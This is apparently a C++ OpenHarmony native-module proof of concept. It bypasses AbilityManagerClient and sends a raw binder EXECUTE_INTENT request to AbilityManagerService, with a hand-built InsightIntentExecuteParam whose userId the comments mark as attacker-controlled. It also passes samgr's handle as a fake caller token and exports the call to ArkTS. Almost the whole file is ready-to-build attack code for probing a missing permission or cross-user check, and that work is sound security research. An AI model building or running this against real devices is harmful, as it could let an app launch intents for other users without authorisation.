/*
 * IPC PoC — bypass AbilityManagerClient, directly hit
 * AbilityManagerService::ExecuteIntent via raw binder.
 *
 * All binder primitives used here (IPCSkeleton / MessageParcel / IRemoteObject)
 * are public OpenHarmony NDK APIs. No system signature required to compile/link.
 *
 * Flow:
 *   IPCSkeleton::GetContextObject()           -> samgr IRemoteObject
 *   samgr->SendRequest(GET_SYSTEM_ABILITY, 4) -> AMS IRemoteObject
 *   ams->SendRequest(EXECUTE_INTENT = 72, …)  -> AbilityManagerService::ExecuteIntent
 *
 * If service-side checks reject us, that proves the server side is doing its job.
 * If they don't (e.g. missing permission check), this is the exploit primitive.
 */

#include <cstdint>
#include <string>
#include <vector>

#include "napi/native_api.h"
#include "hilog/log.h"

#include "iremote_object.h"
#include "message_parcel.h"
#include "message_option.h"
#include "ipc_skeleton.h"

#define LOG_DOMAIN 0x3200
#define LOG_TAG "IpcPoc"

namespace {
constexpr int32_t ABILITY_MGR_SERVICE_ID = 4;
constexpr uint32_t SAMGR_GET_SYSTEM_ABILITY_CODE = 1;   // ISystemAbilityManager::GET_SYSTEM_ABILITY
constexpr uint32_t AMS_EXECUTE_INTENT_CODE = 72;        // AbilityManagerInterfaceCode::EXECUTE_INTENT

constexpr const char16_t* SAMGR_DESCRIPTOR = u"ohos.samgr.SystemAbilityManager";
constexpr const char16_t* AMS_DESCRIPTOR   = u"ohos.aafwk.AbilityManager";

void LogInfo(const std::string& msg)
{
    OHOS::Hilog::Info(OHOS::HilogLabel{LOG_APP, LOG_DOMAIN, LOG_TAG}, "%{public}s", msg.c_str());
}
void LogErr(const std::string& msg)
{
    OHOS::Hilog::Error(OHOS::HilogLabel{LOG_APP, LOG_DOMAIN, LOG_TAG}, "%{public}s", msg.c_str());
}

// 严格按 AbilityManagerStub::ExecuteIntentInner 读的顺序写
//   1. uint64  key
//   2. remote  callerToken
//   3. parcelable<InsightIntentExecuteParam>
bool WriteAmsRequestHeader(OHOS::MessageParcel& data, uint64_t key,
    const OHOS::sptr<OHOS::IRemoteObject>& callerToken)
{
    if (!data.WriteInterfaceToken(AMS_DESCRIPTOR)) return false;
    if (!data.WriteUint64(key)) return false;
    if (!data.WriteRemoteObject(callerToken)) return false;
    return true;
}

// 严格按 InsightIntentExecuteParam::Marshalling 的顺序写 22 个字段
bool WriteInsightIntentParam(OHOS::MessageParcel& data, int32_t targetUserId)
{
    if (!data.WriteString16(u"com.example.targetapp")) return false;  // bundleName_
    if (!data.WriteString16(u"entry"))                  return false;  // moduleName_
    if (!data.WriteString16(u"EntryAbility"))           return false;  // abilityName_
    if (!data.WriteString16(u"DefaultIntent"))          return false;  // insightIntentName_
    if (!data.WriteBool(false))                         return false;  // insightIntentParam_ = nullptr
    if (!data.WriteInt32(0))                            return false;  // executeMode_
    if (!data.WriteUint64(0x1234))                      return false;  // insightIntentId_
    if (!data.WriteInt32(0))                            return false;  // displayId_
    if (!data.WriteStringVector({}))                    return false;  // uris_
    if (!data.WriteInt32(0))                            return false;  // flags_
    if (!data.WriteInt32(targetUserId))                 return false;  // userId_  ← attacker-controlled
    if (!data.WriteInt8(0))                             return false;  // decoratorType_
    if (!data.WriteString16(u""))                       return false;  // srcEntrance_
    if (!data.WriteString16(u""))                       return false;  // className_
    if (!data.WriteString16(u""))                       return false;  // methodName_
    if (!data.WriteString16(u""))                       return false;  // methodReturnType_
    if (!data.WriteStringVector({}))                    return false;  // methodParams_
    if (!data.WriteString16(u""))                       return false;  // pagePath_
    if (!data.WriteString16(u""))                       return false;  // navigationId_
    if (!data.WriteString16(u""))                       return false;  // navDestinationName_
    if (!data.WriteBool(false))                         return false;  // isServiceMatch_
    if (!data.WriteString16(u""))                       return false;  // deviceId_  (local path)
    return true;
}

// 通过 samgr 拿 AMS 的 IRemoteObject
OHOS::sptr<OHOS::IRemoteObject> GetAmsProxy()
{
    auto samgr = OHOS::IPCSkeleton::GetContextObject();
    if (samgr == nullptr) {
        LogErr("GetContextObject returned null");
        return nullptr;
    }
    LogInfo("got samgr IRemoteObject");

    OHOS::MessageParcel data, reply;
    OHOS::MessageOption opt;
    if (!data.WriteInterfaceToken(SAMGR_DESCRIPTOR)) {
        LogErr("write samgr descriptor failed");
        return nullptr;
    }
    if (!data.WriteInt32(ABILITY_MGR_SERVICE_ID)) {
        LogErr("write ability id failed");
        return nullptr;
    }
    int err = samgr->SendRequest(SAMGR_GET_SYSTEM_ABILITY_CODE, data, reply, opt);
    if (err != 0) {
        LogErr("samgr SendRequest failed: " + std::to_string(err));
        return nullptr;
    }
    auto ams = reply.ReadRemoteObject();
    if (ams == nullptr) {
        LogErr("ReadRemoteObject for AMS returned null");
        return nullptr;
    }
    LogInfo("got AMS IRemoteObject via samgr");
    return ams;
}

// 主攻击函数：直接对 AMS 发 EXECUTE_INTENT
// 返回 service 端 ExecuteIntent 写回的 result code
int32_t DirectExecuteIntent(int32_t targetUserId, uint64_t key)
{
    auto ams = GetAmsProxy();
    if (ams == nullptr) {
        return -1001;
    }

    // callerToken 用 samgr 自己的 IRemoteObject 作占位（service 只 null-check）
    auto callerToken = OHOS::IPCSkeleton::GetContextObject();

    OHOS::MessageParcel data, reply;
    OHOS::MessageOption opt;
    opt.SetFlags(OHOS::MessageOption::TF_SYNC);

    if (!WriteAmsRequestHeader(data, key, callerToken)) {
        LogErr("WriteAmsRequestHeader failed");
        return -1002;
    }
    if (!WriteInsightIntentParam(data, targetUserId)) {
        LogErr("WriteInsightIntentParam failed");
        return -1003;
    }

    LogInfo("sending EXECUTE_INTENT (code=72), userId=" + std::to_string(targetUserId));
    int err = ams->SendRequest(AMS_EXECUTE_INTENT_CODE, data, reply, opt);
    if (err != 0) {
        LogErr("AMS SendRequest err: " + std::to_string(err));
        return err;
    }
    int32_t result = reply.ReadInt32();
    LogInfo("ExecuteIntent service-side result: " + std::to_string(result));
    return result;
}
}  // namespace

// ---------------- NAPI 导出 ----------------

static napi_value JsDirectExecuteIntent(napi_env env, napi_callback_info info)
{
    size_t argc = 2;
    napi_value argv[2] = { nullptr };
    napi_get_cb_info(env, info, &argc, argv, nullptr, nullptr);

    int32_t userId = 0;
    uint64_t key = 0xdeadbeefULL;
    if (argc >= 1) {
        napi_get_value_int32(env, argv[0], &userId);
    }
    if (argc >= 2) {
        double d = 0;
        napi_get_value_double(env, argv[1], &d);
        key = static_cast<uint64_t>(d);
    }

    int32_t ret = DirectExecuteIntent(userId, key);

    napi_value result;
    napi_create_int32(env, ret, &result);
    return result;
}

EXTERN_C_START
static napi_value Init(napi_env env, napi_value exports)
{
    napi_property_descriptor desc[] = {
        { "directExecuteIntent", nullptr, JsDirectExecuteIntent, nullptr, nullptr, nullptr, napi_default, nullptr },
    };
    napi_define_properties(env, exports, sizeof(desc) / sizeof(desc[0]), desc);
    return exports;
}
EXTERN_C_END

static napi_module pocModule = {
    .nm_version = 1,
    .nm_flags = 0,
    .nm_filename = nullptr,
    .nm_register_func = Init,
    .nm_modname = "poc",   // ArkTS 里 import 'libpoc.so'
    .nm_priv = nullptr,
    .reserved = { 0 },
};

extern "C" __attribute__((constructor)) void RegisterPocModule(void)
{
    napi_module_register(&pocModule);
}
